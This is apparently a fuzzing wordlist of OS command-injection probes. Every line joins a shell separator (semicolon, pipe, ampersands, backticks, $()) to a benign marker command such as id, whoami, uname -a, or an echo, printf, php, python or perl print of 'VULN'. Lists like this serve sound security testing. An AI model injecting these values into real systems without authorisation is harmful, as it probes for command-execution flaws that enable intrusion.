;id
|id
&id
&&id
||id
`id`
$(id)
;whoami
|whoami
;uname -a
|uname -a
;echo VULNERABLE
|echo VULNERABLE
&echo VULNERABLE
&&echo VULNERABLE
||echo VULNERABLE
`echo VULNERABLE`
$(echo VULNERABLE)
;echo INJECTED
|echo INJECTED
;printf 'VULN'
;php -r "echo 'VULN';"
;python3 -c "print('VULN')"
;perl -e "print 'VULN'"